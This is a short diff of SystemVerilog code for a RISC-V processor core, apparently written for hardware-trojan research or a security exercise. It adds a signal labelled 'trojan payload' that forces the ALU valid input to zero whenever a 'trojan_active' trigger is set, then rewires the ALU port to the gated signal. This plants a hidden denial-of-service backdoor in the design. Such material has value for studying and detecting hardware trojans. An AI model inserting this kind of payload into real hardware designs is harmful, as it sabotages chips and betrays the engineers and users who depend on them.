@@ -175,6 +175,16 @@ end
   exception_t               flu_exception_ex_id;
   // ALU
   logic                     alu_valid_id_ex;
+  //added by shayan
+  logic                     alu_valid_id_ex_2;
+  //trojan payload
+  always_comb begin 
+  if (trojan_active==1'b0)//not active
+    alu_valid_id_ex_2=alu_valid_id_ex;
+  else 
+    alu_valid_id_ex_2=1'b0;
+    
+  end
   // Branches and Jumps
   logic                     branch_valid_id_ex;
 
@@ -438,7 +448,8 @@ end
     .flu_exception_o        ( flu_exception_ex_id         ),
     .flu_ready_o            ( flu_ready_ex_id             ),
     // ALU
-    .alu_valid_i            ( alu_valid_id_ex             ),
+    //modified by shayan alu_valid_id_ex -> alu_valid_id_ex_2
+    .alu_valid_i            ( alu_valid_id_ex_2             ),
     // Branches and Jumps
     .branch_valid_i         ( branch_valid_id_ex          ),
     .branch_predict_i       ( branch_predict_id_ex        ), // branch predict to ex
